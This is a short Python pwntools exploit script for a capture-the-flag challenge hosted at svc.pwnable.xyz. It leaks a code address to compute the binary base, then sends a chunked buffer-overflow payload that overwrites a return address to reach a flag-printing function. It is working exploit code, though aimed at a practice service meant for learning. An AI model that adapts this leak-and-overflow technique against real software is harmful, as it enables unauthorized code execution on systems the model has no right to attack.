from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30014)
# gdb.attach(p)	

while(True):
	p.sendlineafter('> ', '2')
	p.recvuntil('Give me ')
	num = int(p.recvuntil(' ')[:-1])
	if num==0:
		continue		
	if num<14:
		p.sendafter('chars: ', '\x00')
	else:
		p.sendafter('chars: ', 'AAAAAAAA')
		break

p.sendlineafter('> ', '3')
p.recvuntil('Your message: ')
p.recvuntil('AAAAAAAA')
leak = u64(p.recv(6)+'\x00\x00')
binary_base = leak - 0xbc2

p.sendlineafter('> ', '1')
p.sendafter('data: ', 'A'*0x7f)

payload = 'A'*(0x408-0x7f) + p64(binary_base + 0xb57)
idx = 0
count = len(payload)

while(True):
	p.sendlineafter('> ', '2')
	p.recvuntil('Give me ')
	num = int(p.recvuntil(' ')[:-1])
	p.recvuntil('chars: ')
	if num==0:
		continue
	if num<=count:
		p.send(payload[idx:idx+num-1] + '\x00')
		idx += (num-1)
		count -= (num-1)
	else:
		p.send(payload[idx:idx+count] + '\x00')			
		break

p.sendlineafter('> ', '0')
print p.recvuntil('}')